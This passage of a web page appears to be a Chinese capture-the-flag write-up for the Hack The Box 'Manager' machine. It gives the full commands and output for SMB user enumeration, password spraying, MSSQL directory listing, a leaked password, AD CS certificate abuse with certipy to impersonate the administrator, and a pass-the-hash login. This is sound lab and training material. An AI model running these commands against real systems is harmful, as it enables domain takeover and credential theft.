+<span class="p">|</span><span class="w">   </span><span class="m">311</span>:<span class="w"> </span>
+<span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
+<span class="p">|</span><span class="w"> </span>smb2-time:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2023</span>-10-26T07:34:59
+<span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span>N/A
+</code></pre></div>
+<ul>
+<li><code>cme smb 10.10.11.236 -u guest -p '' --shares --rid-brute</code></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code>SMB         dc01.manager.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+SMB         dc01.manager.htb 445    DC01             [+] manager.htb\guest: 
+SMB         dc01.manager.htb 445    DC01             [*] Enumerated shares
+SMB         dc01.manager.htb 445    DC01             Share           Permissions     Remark
+SMB         dc01.manager.htb 445    DC01             -----           -----------     ------
+SMB         dc01.manager.htb 445    DC01             ADMIN$                          Remote Admin
+SMB         dc01.manager.htb 445    DC01             C$                              Default share
+SMB         dc01.manager.htb 445    DC01             IPC$            READ            Remote IPC
+SMB         dc01.manager.htb 445    DC01             NETLOGON                        Logon server share 
+SMB         dc01.manager.htb 445    DC01             SYSVOL                          Logon server share 
+SMB         dc01.manager.htb 445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         dc01.manager.htb 445    DC01             500: MANAGER\Administrator (SidTypeUser)
+SMB         dc01.manager.htb 445    DC01             501: MANAGER\Guest (SidTypeUser)
+SMB         dc01.manager.htb 445    DC01             502: MANAGER\krbtgt (SidTypeUser)
+SMB         dc01.manager.htb 445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
+SMB         dc01.manager.htb 445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
+SMB         dc01.manager.htb 445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
+SMB         dc01.manager.htb 445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
+SMB         dc01.manager.htb 445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
+SMB         dc01.manager.htb 445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
+SMB         dc01.manager.htb 445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
+SMB         dc01.manager.htb 445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
+SMB         dc01.manager.htb 445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
+SMB         dc01.manager.htb 445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
+SMB         dc01.manager.htb 445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
+SMB         dc01.manager.htb 445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
+SMB         dc01.manager.htb 445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
+SMB         dc01.manager.htb 445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
+SMB         dc01.manager.htb 445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
+SMB         dc01.manager.htb 445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         dc01.manager.htb 445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         dc01.manager.htb 445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
+SMB         dc01.manager.htb 445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
+SMB         dc01.manager.htb 445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
+SMB         dc01.manager.htb 445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
+SMB         dc01.manager.htb 445    DC01             1113: MANAGER\Zhong (SidTypeUser)
+SMB         dc01.manager.htb 445    DC01             1114: MANAGER\Cheng (SidTypeUser)
+SMB         dc01.manager.htb 445    DC01             1115: MANAGER\Ryan (SidTypeUser)
+SMB         dc01.manager.htb 445    DC01             1116: MANAGER\Raven (SidTypeUser)
+SMB         dc01.manager.htb 445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
+SMB         dc01.manager.htb 445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
+SMB         dc01.manager.htb 445    DC01             1119: MANAGER\Operator (SidTypeUser)
+</code></pre></div>
+<p>发现部分用户名，转小写保存</p>
+<div class="language-text highlight"><pre><span></span><code>administrator
+guest
+krbtgt
+dc01$
+zhong
+cheng
+ryan
+raven
+jinwoo
+chinhae
+operator
+</code></pre></div>
+<h3 id="shell-as-mssql">Shell as mssql</h3>
+<p>尝试使用用户名枚举密码，因为 nmap 扫到 mssql 所以一起枚举一下</p>
+<ul>
+<li><code>cme smb 10.10.11.236 -u user.txt -p user.txt --no-brute</code></li>
+<li><code>cme mssql 10.10.11.236 -u user.txt -p user.txt --no-brute</code></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code>SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE 
+SMB         10.10.11.236    445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE 
+SMB         10.10.11.236    445    DC01             [-] manager.htb\dc01$:dc01$ STATUS_LOGON_FAILURE 
+SMB         10.10.11.236    445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE 
+SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE 
+SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
+SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE 
+SMB         10.10.11.236    445    DC01             [-] manager.htb\jinwoo:jinwoo STATUS_LOGON_FAILURE 
+SMB         10.10.11.236    445    DC01             [-] manager.htb\chinhae:chinhae STATUS_LOGON_FAILURE 
+SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
+MSSQL       10.10.11.236    1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
+MSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\operator:operator
+</code></pre></div>
+<p>发现两组凭据</p>
+<div class="language-text highlight"><pre><span></span><code>SMB://operator:operator
+MSSQL://operator:operator
+</code></pre></div>
+<p>SMB 没看到什么信息，连接 MSSQL，xp_cmdshell 无法使用，可以用 xp_dirtree</p>
+<ul>
+<li><code>exec xp_dirtree 'c:\inetpub\wwwroot\',1,1</code> 找到 Web 目录，发现 backup</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code>SQL (MANAGER\Operator  guest@master)&gt; exec xp_dirtree &#39;c:\inetpub\wwwroot\&#39;,1,1
+subdirectory                      depth   file   
+-------------------------------   -----   ----   
+about.html                            1      1   
+contact.html                          1      1   
+css                                   1      0   
+images                                1      0   
+index.html                            1      1   
+js                                    1      0   
+service.html                          1      1   
+web.config                            1      1   
+website-backup-27-07-23-old.zip       1      1
+</code></pre></div>
+<h3 id="shell-as-maven">Shell as maven</h3>
+<p>Web 服务下载 backup 发现新凭据</p>
+<p><img alt="image-20231026104215826" src="https://cdn.jsdelivr.net/gh/zer0-hex/image-hosting@main/typora/202310261044593.png" /></p>
+<ul>
+<li><code>evil-winrm -u raven -p 'R4v3nBe5tD3veloP3r!123' -i 10.10.11.236</code></li>
+</ul>
+<p><img alt="image-20231026112607992" src="https://cdn.jsdelivr.net/gh/zer0-hex/image-hosting@main/typora/202310261126068.png" /></p>
+<ul>
+<li><code>certipy find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236</code></li>
+</ul>
+<p><img alt="image-20231026112714624" src="https://cdn.jsdelivr.net/gh/zer0-hex/image-hosting@main/typora/202310261127672.png" /></p>
+<h3 id="shell-as-system">Shell as SYSTEM</h3>
+<ol>
+<li><code>certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'</code></li>
+</ol>
+<p>```
+Certipy v4.7.0 - by Oliver Lyak (ly4k)</p>
+<p>[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
+<div class="language-text highlight"><pre><span></span><code>2. ```
+   certipy ca -ca &#39;manager-DC01-CA&#39; -enable-template SubCA -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39;
+   ```
+</code></pre></div>
+Certipy v4.7.0 - by Oliver Lyak (ly4k)</p>
+<p>[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
+<div class="language-text highlight"><pre><span></span><code>3. ```
+   certipy req -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -ca manager-DC01-CA -target ca.manager.htb -template SubCA -upn administrator@manager.htb
+   ```
+</code></pre></div>
+Certipy v4.7.0 - by Oliver Lyak (ly4k)</p>
+<p>[<em>] Requesting certificate via RPC
+[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
+[</em>] Request ID is 15
+Would you like to save the private key? (y/N) y
+[*] Saved private key to 15.key
+[-] Failed to request certificate
+<div class="language-text highlight"><pre><span></span><code>4. ```
+    certipy ca -ca &#39;manager-DC01-CA&#39; -issue-request 15 -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39;
+   ```
+</code></pre></div>
+Certipy v4.7.0 - by Oliver Lyak (ly4k)</p>
+<p>[*] Successfully issued certificate
+<div class="language-text highlight"><pre><span></span><code>5. ```
+   certipy req -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -ca &#39;manager-DC01-CA&#39; -target ca.manager.htb -retrieve 15
+   ```
+</code></pre></div>
+Certipy v4.7.0 - by Oliver Lyak (ly4k)</p>
+<p>[<em>] Rerieving certificate with ID 15
+[</em>] Successfully retrieved certificate
+[<em>] Got certificate with UPN 'administrator@manager.htb'
+[</em>] Certificate has no object SID
+[<em>] Loaded private key from '15.key'
+[</em>] Saved certificate and private key to 'administrator.pfx'
+<div class="language-text highlight"><pre><span></span><code>* 提取 Hash
+* `sudo ntpdate -s 10.10.11.236`
+* `certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236`
+</code></pre></div>
+Certipy v4.7.0 - by Oliver Lyak (ly4k)</p>
+<p>[<em>] Using principal: administrator@manager.htb
+[</em>] Trying to get TGT...
+[<em>] Got TGT
+[</em>] Saved credential cache to 'administrator.ccache'
+[<em>] Trying to retrieve NT hash for 'administrator'
+[</em>] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
+<div class="language-text highlight"><pre><span></span><code>* `evil-winrm -u administrator --hash &#39;ae5064c2f62317332c88629e025924ef&#39; -i 10.10.11.236`
+</code></pre></div>
+type c:\Users\Administrator\Desktop\root.txt
+```</p>
+<p><img alt="image-20231026185504460" src="https://cdn.jsdelivr.net/gh/zer0-hex/image-hosting@main/typora/202310261855500.png" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.expand", "navigation.path", "navigation.top", "toc.follow", "toc.integrate", "navigation.instant", "navigation.instant.progress", "header.autohide"], "search": "../../../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d7c377c4.min.js"></script>
+      
+    
+  </body>
+</html>
